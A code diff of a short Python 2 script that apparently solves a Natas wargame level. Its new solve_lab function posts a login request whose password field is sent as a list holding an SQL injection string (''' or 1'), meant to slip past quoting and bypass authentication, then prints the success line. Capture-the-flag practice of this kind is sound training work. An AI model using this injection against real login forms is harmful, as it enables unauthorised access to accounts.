@@ -16,8 +16,12 @@ request = requests.Session()
 
 def get_source_code():
   
-  #connection = request.get(url+perl_injection, auth = login)
+  connection = request.get(url, auth = login)
  
+  
+  print connection.text
+
+def solve_lab():
   connection = request.post(url, auth = login, data = {"username": "natas31", "password": ["'' or 1", 2]})
 
   
@@ -25,7 +29,3 @@ def get_source_code():
   for x in connection.iter_lines():
     if "win!" in x:
       print x
-  #print connection.text
-
-#def solve_lab():
-  
